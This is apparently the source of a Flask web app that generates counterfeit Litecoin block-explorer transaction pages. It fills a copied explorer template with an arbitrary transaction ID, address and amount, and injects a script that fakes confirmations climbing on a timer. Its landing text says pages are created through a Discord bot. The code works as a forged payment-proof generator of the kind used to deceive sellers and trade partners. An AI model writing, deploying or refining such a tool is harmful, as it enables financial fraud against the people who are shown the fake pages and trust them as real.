from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime

# Initialize Flask app
app = Flask(__name__)

# In-memory storage for transaction data
TRANSACTIONS = {}

def render_transaction_page(txid, amount, receiving_address, created_at=None):
    """Generate transaction page HTML with dynamic content"""
    
    # Read the template file
    try:
        with open('ltc/tx/goo9htrad6r7krkkr05zmqro33fm63bcie.html', 'r') as f:
            template = f.read()
    except FileNotFoundError:
        # Try alternative template file
        try:
            with open('index.html', 'r') as f:
                template = f.read()
        except FileNotFoundError:
            # Fallback to a basic template if file doesn't exist
            template = """<!DOCTYPE html>
<html><head><title>Transaction {txid}</title></head>
<body><h1>Transaction {txid}</h1><p>Amount: {amount} LTC</p><p>Address: {address}</p></body></html>"""
            return template.format(txid=txid, amount=amount, address=receiving_address)
    
    # Replace the transaction ID
    html = template.replace('fb720030416a46e6ac5241f66abeaa8f', txid)

    # Replace the full receiving address but keep the input address unchanged
    html = html.replace('LM9kpsqwmF2YRZ4giW7C4FmUiEaiBSpF54', receiving_address)

    # Replace all amounts throughout the document
    html = html.replace('0.09087154', str(amount))

    # Fix asset paths to use absolute paths from root
    html = html.replace(
        'href="css/', 'href="/css/'
    ).replace(
        'src="js/', 'src="/js/'
    ).replace(
        'href="images/', 'href="/images/'
    ).replace(
        'src="images/', 'src="/images/'
    ).replace(
        'href="//fonts.googleapis.com', 'href="https://fonts.googleapis.com'
    )

    # Get current time for this specific transaction
    current_time = datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')

    # Make the amounts bold in the dashboard section
    html = html.replace(
        '<span class="dash-label">Amount Transacted</span><br>\n          ' + str(amount) + ' LTC',
        '<span class="dash-label">Amount Transacted</span><br>\n          <strong>' + str(amount) + ' LTC</strong>'
    ).replace(
        '<span class="dash-label">Fees</span><br>\n          0.00000366 LTC',
        '<span class="dash-label">Fees</span><br>\n          <strong>0.00000366 LTC</strong>'
    ).replace(
        '<time class="timeago" datetime="2024-06-21T17:06:34Z">\n            Less than a minute ago\n          </time>',
        f'<strong><time class="timeago" datetime="{current_time}">\n            a few seconds ago\n          </time></strong>'
    )

    # Update confirmation section
    html = html.replace(
        '<span id="conf-section" class="pending">\n              <i class="fa fa-unlock"></i> \n              <span id="num-confs">1/6</span>\n            </span>',
        '<span id="conf-section" class="pending">\n              <i class="fa fa-lock" style="color: #A8184F;"></i> \n              <span id="num-confs" style="color: #A8184F;">0/6</span>\n            </span>'
    )

    # Convert created_at to a Unix timestamp in milliseconds for JS
    if created_at:
        from datetime import timezone
        try:
            dt = datetime.fromisoformat(created_at)
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            server_start_time_ms = int(dt.timestamp() * 1000)
        except Exception:
            server_start_time_ms = 'Date.now()'
    else:
        server_start_time_ms = 'Date.now()'

    # Add dynamic confirmation and time update script
    confirmation_script = f'''
    <script>
    // Server-set creation time — identical for every visitor
    const startTime = {server_start_time_ms};

    const FIRST_CONF_DELAY  = 240000; // 4 minutes until 1/6
    const CONF_INTERVAL     = 120000; // 2 minutes per step after that
    const MAX_CONFS         = 6;

    // Calculate how many confirmations should be showing right now
    function calcConfirmations() {{
        const elapsed = Date.now() - startTime;
        if (elapsed < FIRST_CONF_DELAY) return 0;
        return Math.min(MAX_CONFS, 1 + Math.floor((elapsed - FIRST_CONF_DELAY) / CONF_INTERVAL));
    }}

    // How many ms until the next confirmation tick
    function msUntilNext(confs) {{
        if (confs >= MAX_CONFS) return null;
        const nextAt = confs === 0
            ? startTime + FIRST_CONF_DELAY
            : startTime + FIRST_CONF_DELAY + (confs * CONF_INTERVAL);
        return Math.max(0, nextAt - Date.now());
    }}

    function applyConfirmations(n) {{
        const confSection = document.getElementById('conf-section');
        const numConfs    = document.getElementById('num-confs');
        if (!confSection || !numConfs) return;
        const lockIcon = confSection.querySelector('i');

        numConfs.textContent = n + '/6';

        if (n === 0) {{
            lockIcon.style.color    = '#A8184F';
            numConfs.style.color    = '#A8184F';
            lockIcon.className      = 'fa fa-lock';
            confSection.className   = 'pending';
        }} else if (n >= MAX_CONFS) {{
            lockIcon.style.color    = '#28a745';
            numConfs.style.color    = '#28a745';
            lockIcon.className      = 'fa fa-unlock';
            confSection.className   = 'completed';
        }} else {{
            lockIcon.style.color    = '#ff8c00';
            numConfs.style.color    = '#ff8c00';
            lockIcon.className      = 'fa fa-lock';
            confSection.className   = 'pending';
        }}
    }}

    function tick() {{
        const n = calcConfirmations();
        applyConfirmations(n);
        const wait = msUntilNext(n);
        if (wait !== null) {{
            setTimeout(tick, wait + 50); // +50 ms to avoid floating-point edge
        }}
    }}

    function formatTimeAgo(minutes) {{
        if (minutes < 1)  return "a few seconds ago";
        if (minutes === 1) return "1 minute ago";
        if (minutes < 60)  return minutes + " minutes ago";
        const h = Math.floor(minutes / 60);
        const m = minutes % 60;
        const hStr = h === 1 ? "1 hour" : h + " hours";
        const mStr = m === 0 ? "" : (", " + m + " minute" + (m === 1 ? "" : "s"));
        return hStr + mStr + " ago";
    }}

    function updateTime() {{
        const el = document.querySelector('time.timeago');
        if (el) {{
            const mins = Math.floor((Date.now() - startTime) / 60000);
            el.textContent = formatTimeAgo(mins);
        }}
    }}

    // Run immediately on load
    tick();
    updateTime();
    setInterval(updateTime, 60000);
    </script>
    '''

    # Insert the script before the closing body tag
    html = html.replace('</body></html>', confirmation_script + '\n</body></html>')

    return html

@app.route('/create', methods=['POST'])
def create_page():
    """API endpoint to create a new transaction page"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({'error': 'No JSON data provided'}), 400
        
        txid = data.get('txid')
        amount = data.get('amount')
        address = data.get('address')
        
        if not all([txid, amount, address]):
            return jsonify({'error': 'Missing required fields: txid, amount, address'}), 400
        
        # Store transaction data in memory
        TRANSACTIONS[txid] = {
            'txid': txid,
            'amount': amount,
            'address': address,
            'created_at': datetime.utcnow().isoformat()
        }
        
        return jsonify({
            'success': True,
            'txid': txid,
            'url': f'/ltc/tx/{txid}'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/ltc/tx/<txid>')
def serve_transaction_page(txid):
    """Serve transaction pages dynamically"""
    if txid not in TRANSACTIONS:
        return "Transaction not found", 404
    
    tx_data = TRANSACTIONS[txid]
    html = render_transaction_page(tx_data['txid'], tx_data['amount'], tx_data['address'], tx_data.get('created_at'))
    return html

@app.route('/')
def serve_index():
    """Serve the main index page"""
    try:
        return send_from_directory('.', 'index.html')
    except FileNotFoundError:
        # If index.html doesn't exist, return a simple landing page
        return '''
<!DOCTYPE html>
<html>
<head>
    <title>Litecoin Transaction Explorer</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
    <link href="/css/custom.css" rel="stylesheet">
</head>
<body>
    <div class="container text-center" style="margin-top: 100px;">
        <h1>Litecoin Transaction Explorer</h1>
        <p>Transaction pages are dynamically generated via Discord bot.</p>
        <p>Use the Discord bot to create transaction pages at <code>/ltc/tx/{txid}</code></p>
    </div>
</body>
</html>
        '''

@app.route('/<path:filename>')
def serve_static_files(filename):
    """Serve static files (CSS, JS, images, etc.)"""
    return send_from_directory('.', filename)

if __name__ == '__main__':
    # Enable CORS for external requests
    app.config['DEBUG'] = False  # Disable debug in production
    app.run(host='0.0.0.0', port=5000, threaded=True)
